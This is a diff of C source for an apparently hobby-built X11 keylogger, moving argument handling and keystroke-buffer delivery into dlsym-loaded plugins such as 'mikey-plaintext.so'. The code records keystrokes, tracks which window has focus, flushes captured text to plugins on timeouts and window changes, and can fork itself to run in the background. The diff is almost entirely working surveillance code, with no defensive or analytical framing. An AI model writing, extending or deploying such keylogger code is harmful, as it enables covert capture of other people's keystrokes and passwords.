@@ -14,30 +14,35 @@
 time_t timeout = 0;
 
 int background = 0;
-int output = 0;
 char *outputfile = "key.log";
 const char *plugins[] = {"mikey-plaintext.so"};
 
-void handleArgs(int argc, char* argv[]) {
+void handleArgs(void **hdlarr, int argc, char* argv[]) {
 
     int i;
+
+    moduleHandleArgs(hdlarr, argc, argv);
 
     for (i = 1; i < argc; i++) {
         if ((strcmp(argv[i], "-b") == 0) || (strcmp(argv[i], "--background") == 0)) {
             background = 1;
         }
-
-        else if ((strcmp(argv[i], "-o") == 0) || (strcmp(argv[i], "--output") == 0)) {
-            output = 1;
-            if (i + 1 <= argc - 1)  {
-                i++;
-                outputfile = argv[i];
-            }
-            else {
-                printf("Not good.");
-            }
-        }
     }
+}
+
+void moduleHandleArgs(void **hdlarr, int arc, char* argv[]) {
+    typedef void (*initf)();
+    initf func;
+    char *result;
+
+    func = dlsym(hdlarr[0], "handleArgs");
+    result = dlerror();
+    if (result) {
+        printf("%s", result);
+    }
+
+    func(arc, argv);
+
 }
 
 void *initPlugins(void **hdlarr) {
@@ -51,12 +56,12 @@ void *initPlugins(void **hdlarr) {
     }
 }
 
-void pluginExecute(void **hdlarr, char *function, char *b) {
+void moduleFeed(void **hdlarr, char *b) {
     typedef void (*initf)();
     initf func;
     char *result;
 
-    func = dlsym(hdlarr[0], function);
+    func = dlsym(hdlarr[0], "getFeed");
     result = dlerror();
     if (result) {
         printf("%s", result);
@@ -72,11 +77,8 @@ void addParentheses(char **res) {
     sprintf(*res, " (%s) ", tmp);
 }
 
-void keylogger() {
+void keylogger(void **hdlarr) {
     
-    void *hdlarr[100];
-    initPlugins(hdlarr);
-
     BUFFER *b;
     b = initBuffer();
     Display *display;
@@ -109,7 +111,7 @@ void keylogger() {
 
         if ((logging == 1) && (time(NULL) > timeout)) {
             logging = 0;
-            pluginExecute(hdlarr, "getFeed", b->buffer);
+            moduleFeed(hdlarr, b->buffer);
             emptyData(b);
         }
             
@@ -163,7 +165,7 @@ void keylogger() {
                         }
 
                         if (focusWin != oldfocusWin) {
-                            pluginExecute(hdlarr, "getFeed", b->buffer);
+                            moduleFeed(hdlarr, b->buffer);
                             emptyData(b);
                         }
 
@@ -189,7 +191,7 @@ void keylogger() {
     XCloseDisplay(display);
 }
 
-void createProccess() {
+void createProccess(void **hdlarr) {
     pid_t pid;
     pid = fork();
 
@@ -207,18 +209,21 @@ void createProccess() {
 
     // If proccess, run keylogger.
     if (pid == 0) {
-        keylogger();
+        keylogger(hdlarr);
     }
 }
 
 int main(int argc, char *argv[]) {  
+
+    void *hdlarr[100];
+    initPlugins(hdlarr);
     
-    handleArgs(argc, argv);
+    handleArgs(hdlarr, argc, argv);
 
     if (background) {
-        createProccess();
+        createProccess(hdlarr);
     }
     else {
-        keylogger();
+        keylogger(hdlarr);
     }
 }
